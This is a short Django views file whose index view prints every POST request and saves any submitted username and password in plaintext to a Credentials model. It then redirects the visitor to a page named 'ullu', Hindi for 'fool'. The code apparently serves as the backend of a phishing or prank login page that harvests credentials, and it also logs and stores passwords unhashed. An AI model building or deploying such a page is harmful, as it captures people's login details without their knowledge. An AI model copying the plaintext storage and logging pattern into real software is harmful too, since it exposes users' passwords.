from django.shortcuts import render,redirect
from .models import Credentials
# Create your views here.
def index(request):
    print(request.POST)
    if request.POST.get('username') is not None and request.POST.get('password') is not None:
        creds = Credentials()
        creds.username = request.POST.get('username')
        creds.password = request.POST.get('password')
        creds.save()
        return redirect('ullu')
    context = {}
    return render(request,'index.html',context)

def ullu(request):
    return render(request,'ullu.html')